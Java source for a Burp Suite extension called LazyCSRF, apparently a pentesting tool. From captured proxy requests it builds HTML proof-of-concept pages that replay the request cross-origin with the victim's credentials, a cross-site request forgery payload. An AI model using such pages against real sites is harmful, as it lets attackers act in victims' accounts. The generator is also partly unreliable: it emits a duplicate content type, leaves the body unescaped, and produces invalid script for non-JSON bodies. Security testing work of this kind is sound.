package burp;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.List;

public class BurpExtender implements IBurpExtender, IContextMenuFactory
{

    private IContextMenuInvocation menuInvocation;
    private IBurpExtenderCallbacks burpCallbacks;
    private PrintWriter stdout;

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)
    {
        this.burpCallbacks = callbacks;
        this.burpCallbacks.setExtensionName("LazyCSRF");
        this.burpCallbacks.registerContextMenuFactory(this);

        stdout = new PrintWriter(this.burpCallbacks.getStdout(), true);
        stdout.println("INFO: Hello from LazyCSRF");
    }
    
    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation)
    {
        List<JMenuItem> menuList = new ArrayList<>();
        menuInvocation = invocation;
        if(menuInvocation.getInvocationContext() == IContextMenuInvocation.CONTEXT_PROXY_HISTORY) {
            JMenuItem GeneratePocButton = new JMenuItem("Generate Better CSRF PoC");
            GeneratePocButton.addActionListener(new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent arg0) {
                    if(arg0.getActionCommand().equals("Generate Better CSRF PoC")) {
                        IHttpRequestResponse[] selectedMessages = menuInvocation.getSelectedMessages();
                        for (IHttpRequestResponse req : selectedMessages) {
                            CSRFPoCWindow view = new CSRFPoCWindow("LazyCSRF");
                            view.setVisible();
                            String[] pocTexts = GeneratePoC(req);
                            view.setRequestLabel(pocTexts[0]);
                            view.setCSRFPoCHTML(pocTexts[1]);
                        }
                   }
               }
            });
            menuList.add(GeneratePocButton);
        }
        return menuList;
    }
    
    private String[] GeneratePoC(IHttpRequestResponse req)
    {
        IExtensionHelpers iexHelpers = this.burpCallbacks.getHelpers();
        IRequestInfo reqInfo = iexHelpers.analyzeRequest(req);
        String method = reqInfo.getMethod();
        String body = iexHelpers.bytesToString(req.getRequest()).substring(reqInfo.getBodyOffset());
        String url = reqInfo.getUrl().toString();

        StringBuilder PoCBuilder = new StringBuilder()
                .append("<html>\n")
                .append("<body>\n")
                .append("<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js\"></script>\n")
                .append("<script>\n")
                .append("$.ajax({\n")
                .append("  url: '")
                .append(url)
                .append("',\n")
                .append("  type: '")
                .append(method)
                .append("',\n")
                .append("  contentType: 'application/json; charset=utf-8',\n")
                .append("  xhrFields: {\n")
                .append("    withCredentials: true\n")
                .append("  },\n")
                .append("  crossDomain: true,\n");

        if (isJSON(body)) {
            PoCBuilder.append("  contentType: 'application/json; charset=utf-8',\n")
                    .append("  data: '")
                    .append(body);
        }
        PoCBuilder.append("',\n")
                .append("  success: function (result) {\n")
                .append("    console.log(result);\n")
                .append("  },\n")
                .append("  error: function(result) {\n")
                .append("    console.log(result);\n")
                .append("  }\n")
                .append("});\n")
                .append("</script>\n")
                .append("</body>\n")
                .append("</html>\n");

        String[] pocTexts = {url, PoCBuilder.toString()};
        return pocTexts;
    }

    private boolean isJSON(String json) {
        // org.json.JSON does not work well on burp...
        if (json.startsWith("{") && json.endsWith("}")) {
            return true;
        }
        return false;
    }
}
